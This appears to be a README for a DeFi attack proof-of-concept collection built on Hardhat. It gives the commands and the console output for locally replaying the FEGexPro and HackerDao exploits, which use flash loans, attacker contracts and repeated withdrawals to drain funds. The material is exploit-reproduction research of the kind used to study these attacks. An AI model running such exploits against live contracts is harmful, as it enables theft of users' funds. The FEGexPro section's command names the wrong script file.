# Basic Sample Hardhat Project

This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, a sample script that deploys that contract, and an example of a task implementation, which simply lists the available accounts.

Try running some of the following tasks:

```shell
npx hardhat accounts
npx hardhat compile
npx hardhat clean
npx hardhat test
npx hardhat node
node scripts/sample-script.js
npx hardhat help
```

## 运行

### 模拟运行fegexpro的攻击

> 命令

```
npx hardhat run --network hardhat scripts/hackerdao-script.js
```

> 结果

```
➜  DefiAttackPocBox git:(main) ✗ npx hardhat run --network hardhat scripts/fegexpro-attack.js 
exploit deployed to: 0x243CD2aBE3896f8Fd11AA375CEe04EA685c8fCB8
start flashLoan: wbnb amount 0 bnb amount 0
Now I have WBNB num # 915842289447124857298
path call 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
FEGexPro_address FEG_PRO_FBNB_amount:1051370338227328031779
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
createAttacker:
debug # 1 amt of FBNB 115650737205006083495
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 114598114043831447113 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
withdraw 20204367594460596827 FBNB to 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
path call 0x243cd2abe3896f8fd11aa375cee04ea685c8fcb8
finsh:BNB amount 1026477953416890657908
```

### 模拟hackerdao的攻击

> 过程分析

- [https://jusonalien.github.io/hackerdaogong-ji-fen-xi-fu-xian.html](https://jusonalien.github.io/hackerdaogong-ji-fen-xi-fu-xian.html)

> 命令
```
npx hardhat run --network hardhat scripts/hackerdao-script.js
```
> 结果

```
➜  DefiAttackPocBox git:(main) npx hardhat run --network hardhat scripts/hackerdao-script.js
exploit deployed to: 0x5B06224F736a57635B5BCb50B8EF178B189107cB
owner address 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 contract address 0x5b06224f736a57635b5bcb50b8ef178b189107cb
Now I have flash loaned WBNB num # 2500000000000000000000
after swap Now my WBNB num # 505082833655151138304
now I have 7029656601027818642253 HackerDao
Before swapExactTokensForTokensSupportingFeeOnTransferTokens my wbnb amt: 505082833655151138304
After swapExactTokensForTokensSupportingFeeOnTransferTokens my wbnb amt: 2675137850557090857986
now I have 7582486742903822384 HackerDao
path call 0x5b06224f736a57635b5bcb50b8ef178b189107cb
Finally I have 175208335819332962719 BNB
```